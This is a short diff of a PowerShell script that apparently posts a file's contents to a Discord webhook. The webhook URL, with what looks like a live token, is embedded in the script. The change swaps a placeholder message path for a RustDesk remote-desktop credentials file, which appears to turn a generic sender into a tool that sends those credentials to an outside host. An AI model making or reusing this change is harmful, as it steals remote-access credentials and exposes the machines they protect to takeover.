@@ -7,7 +7,7 @@ param(
     [string]$WebhookUrl = 'https://discord.com/api/webhooks/1194215544342196275/dgFll7XP-mLSiNWHxUoFkSpuKT62Uf5GN-_IlcuB4VknzWky9UwAlPoQRezxzLoIWRJI'
 )
 
-$FilePath = 'C:\path\to\message.txt'
+$FilePath = 'C:\ProgramData\RustDesk\rustdesk-credentials.txt'
 
 if (-not $FilePath) {
     throw 'Update $FilePath in the script before running it.'
